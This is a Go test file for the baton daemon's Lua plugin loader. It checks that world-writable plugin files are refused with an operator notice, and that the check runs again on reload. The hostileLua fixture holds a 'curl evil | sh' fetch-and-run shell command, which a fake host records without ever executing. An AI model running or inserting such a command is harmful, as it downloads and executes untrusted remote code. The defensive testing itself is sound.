package plugin_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cmj0121/baton/internal/config"
	"github.com/cmj0121/baton/internal/plugin"
)

// writeLuaMode writes src to a temp .lua file with an exact mode. It chmods after
// the write because WriteFile's perm is masked by the process umask, so asking
// for 0666 under the usual 022 would quietly produce the 0644 that IS allowed and
// the test would prove nothing.
func writeLuaMode(t *testing.T, src string, perm os.FileMode) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "plug-in.lua")
	if err := os.WriteFile(path, []byte(src), 0o600); err != nil {
		t.Fatalf("write lua: %v", err)
	}
	if err := os.Chmod(path, perm); err != nil {
		t.Fatalf("chmod lua: %v", err)
	}
	return path
}

// hostileLua is a plugin body whose effect on the host is unmistakable: if the
// fake host records this spawn, the file ran.
const hostileLua = `baton.spawn{ kind = "shell", command = "/bin/sh", args = { "-c", "curl evil | sh" } }`

func (h *fakeHost) spawns() []spawnRec {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]spawnRec(nil), h.spawned...)
}

// TestWorldWritablePluginIsNotExecuted is the round's central regression: a
// plugin file anyone on the box may rewrite must not reach the VM at all. The
// assertion is on the HOST, not on the returned error — a load that errored
// after driving the fleet would still have lost.
func TestWorldWritablePluginIsNotExecuted(t *testing.T) {
	h := &fakeHost{}
	p := plugin.New(h)
	defer p.Close()

	path := writeLuaMode(t, hostileLua, 0o666)
	res, err := p.Load(path, config.Config{Prefix: "ctrl+t"})

	if got := h.spawns(); len(got) != 0 {
		t.Fatalf("a world-writable plugin drove the host: %+v", got)
	}
	if err == nil {
		t.Fatal("a world-writable plugin must be refused, not silently skipped")
	}
	if !strings.Contains(err.Error(), "refusing to run plugin") {
		t.Errorf("error = %q, want it to say the plugin was refused", err)
	}
	// The daemon still comes up: the refusal is loud, not fatal, and the operator's
	// YAML base survives it.
	if res.Config.Prefix != "ctrl+t" {
		t.Errorf("base config lost on refusal, prefix = %q", res.Config.Prefix)
	}
}

// TestRefusedPluginNotifiesTheCockpit is the loudness, which is a behaviour and
// not a comment. A daemon that drops the operator's hooks and says so only in a
// log file nobody tails has failed quietly; the notice is the half that reaches
// a human, and it must name the reason.
func TestRefusedPluginNotifiesTheCockpit(t *testing.T) {
	h := &fakeHost{}
	p := plugin.New(h)
	defer p.Close()

	if _, err := p.Load(writeLuaMode(t, hostileLua, 0o666), config.Config{}); err == nil {
		t.Fatal("expected a refusal")
	}
	notices := h.notifies()
	if len(notices) != 1 {
		t.Fatalf("notices = %+v, want exactly one refusal notice", notices)
	}
	if !strings.Contains(notices[0], "not loaded") || !strings.Contains(notices[0], "writable by group or other") {
		t.Errorf("notice = %q, want it to say the plugin was not loaded and why", notices[0])
	}
}

// TestSyntaxErrorStaysQuiet is the other side of the loudness argument: a Lua
// error is the operator's own file failing in a way they just caused, so it must
// NOT raise a cockpit notice. Without this the two events are indistinguishable
// and "loud" means nothing.
func TestSyntaxErrorStaysQuiet(t *testing.T) {
	h := &fakeHost{}
	p := plugin.New(h)
	defer p.Close()

	if _, err := p.Load(writeLua(t, `this is not lua )(`), config.Config{}); err == nil {
		t.Fatal("expected a Lua error")
	}
	if notices := h.notifies(); len(notices) != 0 {
		t.Errorf("a syntax error raised %+v; only a refusal is loud", notices)
	}
}

// TestPluginTrustIsRecheckedOnReload is the TOCTOU that a first-load-only check
// would leave wide open: the file is sound at boot and the daemon runs it, then
// its mode moves and C-t R (or SIGHUP) comes round. Every road into the loader
// is the same road, so the second load must refuse the file the first one ran.
func TestPluginTrustIsRecheckedOnReload(t *testing.T) {
	h := &fakeHost{}
	p := plugin.New(h)
	defer p.Close()

	path := writeLuaMode(t, hostileLua, 0o600)
	if _, err := p.Load(path, config.Config{}); err != nil {
		t.Fatalf("first load of a private plugin: %v", err)
	}
	if len(h.spawns()) != 1 {
		t.Fatalf("the private plugin should have run once, got %+v", h.spawns())
	}

	if err := os.Chmod(path, 0o666); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	if _, err := p.Load(path, config.Config{}); err == nil {
		t.Fatal("a reload must re-check the file, not trust the first load's verdict")
	}
	if got := h.spawns(); len(got) != 1 {
		t.Fatalf("the reload ran the now-writable file: %+v", got)
	}
}

// TestMissingPluginStaysAQuietNoOp keeps the fresh-install path unchanged: no
// file is not a refusal, so it neither errors nor notifies.
func TestMissingPluginStaysAQuietNoOp(t *testing.T) {
	h := &fakeHost{}
	p := plugin.New(h)
	defer p.Close()

	res, err := p.Load(filepath.Join(t.TempDir(), "absent.lua"), config.Config{Prefix: "ctrl+t"})
	if err != nil {
		t.Fatalf("a missing plugin must be a clean no-op, got %v", err)
	}
	if notices := h.notifies(); len(notices) != 0 {
		t.Errorf("a missing plugin notified %+v", notices)
	}
	if res.Config.Prefix != "ctrl+t" {
		t.Errorf("prefix = %q, want the base config", res.Config.Prefix)
	}
}
